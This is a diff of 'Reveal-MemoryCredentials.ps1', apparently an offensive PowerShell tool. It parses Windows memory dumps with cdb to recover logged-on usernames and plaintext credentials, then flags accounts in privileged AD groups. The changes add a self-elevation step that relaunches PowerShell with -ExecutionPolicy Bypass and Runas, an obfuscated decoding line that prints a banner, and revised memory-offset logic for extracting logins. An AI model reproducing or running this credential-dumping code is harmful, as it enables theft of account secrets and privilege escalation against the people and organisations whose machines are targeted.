@@ -63,7 +63,7 @@ $scriptVersion = "0.1"
 
 if(!(Test-Path $logDirectoryPath)) {
     New-Item $logDirectoryPath -type directory | Out-Null
-    Write-Progress -Activity "Directory $logDirectoryPath created" -status "Running..." -id 1
+    #Write-Progress -Activity "Directory $logDirectoryPath created" -status "Running..." -id 1
 }
 
 $logFileName = "Log_" + $launchDate + ".log"
@@ -637,6 +637,7 @@ function Get-DistinguishedNameFromFQDN {
         }
     }  	
 }
+
 # ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
 # Function Name 'Stop-Script' - Stop the script execution
 # ________________________________________________________________________
@@ -647,6 +648,7 @@ function Stop-Script () {
     }
     Process{        
         "Script terminating..." 
+        Write-Host "================================================================================================"
         End-Log -streamWriter $global:streamWriter       
         Exit
     }
@@ -654,6 +656,9 @@ function Stop-Script () {
 
 #----------------------------------------------------------[Execution]----------------------------------------------------------
 Start-Log -scriptName $scriptName -scriptVersion $scriptVersion -streamWriter $global:streamWriter
+cls
+Write-Host "================================================================================================"
+Write-Host -object (("1*0½1*1½1*3½1*0½1*1½1*1½1*3½1*1½*1½1*2½1*3½1*1½1*1½1*1½1*9½1*10½1*11½1*11½1*10½1*12½1*1½1*13½1*14½1*15½1*1½1*12½1*14½1*16½1*13½1*15½1*1½1*17½1*18½1*19½1*19½1*16½1*13½1*1½1*20½1*21½1*22½1*0½1*1½1*1½0*1½1*5½1*1½1*7½1*1½1*1½1*1½1*1½1*1½1*1½1*1½1*23½1*18½1*27½1*24½1*18½1*15½1*25½1*15½1*26½1*8½1*28½1*29½1*18½1*16½1*11½1*6½1*30½1*10½1*29½1*0½1*6½1*5½1*1½1*8½1*1½1*7½1*6½1*1½1*0"-split "½")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99"-split "T")[$matches[2]])"*$matches[1]}})-separator ""
 
 if ((gwmi win32_computersystem).partofdomain -eq $true) {
     $enterpriseAdminsGroup = "Enterprise Admins"
@@ -672,9 +677,7 @@ if ((gwmi win32_computersystem).partofdomain -eq $true) {
     try {$administrators = (Get-ADGroupMember $administratorsGroup -Recursive).DistinguishedName}catch{}
     try {$backupOperators = (Get-ADGroupMember $backupOperatorsGroup -Recursive).DistinguishedName}catch{}            
     
-} else {
-    # workgroup
-}
+} 
 
 <#
 $parentKey = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -683,12 +686,42 @@ $valueRegistryKey = "1"
 
 Set-RegistryKey $Server $parentKey $nameRegistryKey $valueRegistryKey)
 #>
-Write-Host -object (("1*0½1*1½1*3½1*0½1*1½1*1½1*3½1*1½*1½1*2½1*3½1*1½1*1½1*1½1*9½1*10½1*11½1*11½1*10½1*12½1*1½1*13½1*14½1*15½1*1½1*12½1*14½1*16½1*13½1*15½1*1½1*17½1*18½1*19½1*19½1*16½1*13½1*1½1*20½1*21½1*22½1*0½1*1½1*1½0*1½1*5½1*1½1*7½1*1½1*1½1*1½1*1½1*1½1*1½1*1½1*23½1*18½1*27½1*24½1*18½1*15½1*25½1*15½1*26½1*8½1*28½1*29½1*18½1*16½1*11½1*6½1*30½1*10½1*29½1*0½1*6½1*5½1*1½1*8½1*1½1*7½1*6½1*1½1*0"-split "½")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99"-split "T")[$matches[2]])"*$matches[1]}})-separator ""
-$remoteLocalFile = Read-Host 'Local computer, Remote computer or from a dump file ? (local, remote, dump)'
+
+$myComputer = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
+$myUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$amIAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent())
+
+$adminFlag = $amIAdmin.IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+if($adminFlag -eq $true){
+    $adminMessage = " with administrator rights on " 
+}
+else {
+    $adminMessage = " without administrator rights on "
+}
+
+Write-Host "RWMC runs with user " -nonewline; Write-Host $myUser.Name -f Red -nonewline; Write-Host $adminMessage -nonewline; Write-Host $myComputer -f Red -nonewline; Write-Host " computer"
+if($adminFlag -eq $false){
+    Write-Host "You have to launch this script with " -nonewline; Write-Host "local Administrator rights!" -f Red
+    
+    $scriptPath = Split-Path $MyInvocation.InvocationName    
+    $RWMC = $scriptPath + "\Reveal-MemoryCredentials.ps1"
+    $ArgumentList = 'Start-Process -FilePath powershell.exe -ArgumentList \"-ExecutionPolicy Bypass -File "{0}"\" -Verb Runas' -f $RWMC;
+    Start-Process -FilePath powershell.exe -ArgumentList $ArgumentList -Wait -NoNewWindow;
+    
+    #Stop-Script
+}
+
+Write-Host "================================================================================================"
+$remoteLocalFile = Read-Host 'Local computer, Remote computer or from a dump file ?
+1) local
+2) remote
+3) dump
+
+Enter your choice and press <ENTER>'
 switch ($remoteLocalFile){
-    "local" {$dump = "gen"}
-    "remote" {$dump = "remote"}
-    "dump" {$dump = "dump"}
+    "1" {$dump = "gen"}
+    "2" {$dump = "remote"}
+    "3" {$dump = "dump"}
     default {Write-Output "The option could not be determined... generate local dump"}
 }
 
@@ -1127,8 +1160,7 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         # Login
         Write-Progress -Activity "Getting logging information" -status "Running..." -id 1
         
-        $arrayLoginAddress = ($ddSecond -split ' ')   
-        
+        $arrayLoginAddress = ($ddSecond -split ' ')           
         if($mode -eq 1) { $start = 48}
         if($mode -eq 132) { $start = 17}
         if($mode -eq 2 -or $mode -eq "2r2") { $start = 24}
@@ -1137,8 +1169,16 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         $loginAddress1 = $arrayLoginAddress[$foundInstruction] 
         $foundInstruction = [array]::indexof($arrayLoginAddress,"'dd") + $start + 1
         $loginAddress2 = $arrayLoginAddress[$foundInstruction]    
-        $loginAddress = "$loginAddress2$loginAddress1"                            
-                
+        $loginAddress = "$loginAddress2$loginAddress1"                                    
+
+        if($loginAddress -eq "0000000000000000"){
+            $start = 24
+            $foundInstruction = [array]::indexof($arrayLoginAddress,"'dd") + $start
+            $loginAddress1 = $arrayLoginAddress[$foundInstruction]       
+            $foundInstruction = [array]::indexof($arrayLoginAddress,"'dd") + $start + 1
+            $loginAddress2 = $arrayLoginAddress[$foundInstruction]      
+            $loginAddress = "$loginAddress2$loginAddress1"                                                    
+        }
 
         $loginDB = &$CdbProgramPath -z $file -c "du $loginAddress;Q"   
         $arrayloginDBAddress = ($loginDB -split ' ')    
@@ -1146,11 +1186,11 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         $foundInstruction = [array]::indexof($arrayloginDBAddress,"'du") + 4
         $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
 
-        $loginPlainText = $loginPlainText1 -replace """",""                             
+        $loginPlainText = $loginPlainText1 -replace """",""                                     
         if ((gwmi win32_computersystem).partofdomain -eq $true) {
             $user = ""
             $user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText -or sAMAccountName -like $loginPlainText}             
-            if($user -ne $null -and $user -ne "") {
+            if(![string]::IsNullOrEmpty($user)) {
                 $user = $user.DistinguishedName   
                 $enterpriseAdminsFlag = "false"
                 $schemaAdminsFlag = "false"
